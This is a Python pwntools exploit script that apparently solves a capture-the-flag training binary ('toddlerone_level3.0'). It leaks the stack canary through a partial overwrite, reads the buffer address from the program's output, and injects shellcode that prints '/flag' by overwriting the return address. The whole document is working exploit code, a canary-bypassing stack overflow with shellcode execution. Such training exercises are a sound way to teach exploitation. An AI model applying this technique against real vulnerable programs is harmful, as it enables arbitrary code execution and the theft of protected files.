#!/usr/bin/python3
from pwn import *

# Set the machine architecture
context.arch = 'amd64'

# Retrieve the ELF information from the binary
elf = ELF("/challenge/toddlerone_level3.0")

# Compute the distance from the buffer to the canary on the stack
buffer_offset = 0x58
canary_offset = 0x10
canary_distance = buffer_offset - canary_offset

# Run the program
io = elf.process()

# Send the size of the first payload to the program
io.recvuntil(b'Payload size:')
io.sendline(f'{canary_distance + 1}'.encode())

# Build and send the size of the first payload to the program
# NOTE: the payload will overwrite the first byte of the canary in order
#       to make the program print it. Also, the payload will trigger the
#       secret method to call another time the 'challenge' method before
#       returning in order to avoid stack smashing.
PAYLOAD = b'A'*(canary_distance-6) + b'REPEAT' + b'B'
io.recvuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Retrieve the canary by reading the output and selecting the correct bytes
io.recvuntil(b'REPEATB')
canary = b'\x00' + io.recvline().strip()[:7]

# Retrieve the address of the buffer location where we will load the shellcode
io.readuntil(b'The input buffer begins at 0x')
buffer_addr = int(io.readuntil(b',').decode()[:-1], 16)

# Send the payload size to the program
# NOTE: the size of the payload is computed as: 
#       distance_from_return_address + return_address_length
io.recvuntil('Payload size:')
io.sendline(f'{buffer_offset + 8}'.encode())

# Build the shellcode to open the "/flag" file
shellcode = asm(shellcraft.cat('/flag'))

# Build and send the payload to the program
# NOTE: as return address we set the buffer address and we load less padding
#       in order to fit the shellcode inside the buffer
PAYLOAD = shellcode + b'A'*(canary_distance - len(shellcode)) + canary + b'B'*(8) + p64(buffer_addr)
io.recvuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Print the output of the program
# NOTE: errors='ignore' or errors='replace' is needed in order
#       to be able to print the program output
print(io.recvall().decode(errors='ignore'))
